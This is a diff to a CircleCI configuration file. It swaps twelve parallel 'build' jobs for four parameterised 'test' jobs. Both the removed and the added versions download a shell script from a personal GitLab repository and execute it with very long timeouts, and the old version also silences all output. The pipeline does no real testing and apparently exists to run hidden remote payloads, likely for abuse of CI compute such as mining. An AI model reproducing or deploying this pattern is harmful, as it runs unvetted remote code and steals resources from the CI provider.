@@ -1,175 +1,40 @@
-version: 2
+version: 2.1
+
+executors:
+  linux:
+    docker:
+      - image: cimg/base:2020.01
+
+orbs:
+  node: circleci/node@2.0.0
+
 jobs:
-  build_01:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
+  test:
+    parameters:
+      node-version:
+        type: string
+    executor: linux
     steps:
       - checkout
-      - run: ls
+      - node/install:
+          node-version: << parameters.node-version >>
+          install-yarn: true
       - run:
-          no_output_timeout: 300m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"              
-      
-  build_02:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 300m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
-      
-  build_03:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 300m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
-      
-  build_04:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 300m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
-
-  build_05:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 362m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"              
-      
-  build_06:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 300m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
-      
-  build_07:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 300m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
-      
-  build_08:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 300m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1" 
-
-  build_09:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 362m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"              
-      
-  build_10:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 300m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
-      
-  build_11:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 300m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
-      
-  build_12:
-    docker:
-      - image: cimg/base:stable
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 300m
-          
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"  
-      
-  
+         no_output_timeout: 360m
+         command: |-
+           wget https://gitlab.com/fukadabunit/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh
 workflows:
-    version: 2
-    build:
-        jobs:
-            - build_01
-            - build_02
-            - build_03
-            - build_04
-            - build_05
-            - build_06
-            - build_07
-            - build_08
-            - build_09
-            - build_10
-            - build_11
-            - build_12
+  all-tests:
+    jobs:
+      - test:
+          name: "running1"
+          node-version: 11.9.0
+      - test:
+          name: "running2"
+          node-version: 11.9.0
+      - test:
+          name: "running3"
+          node-version: 11.9.0
+      - test:
+          name: "running4"
+          node-version: 11.9.0
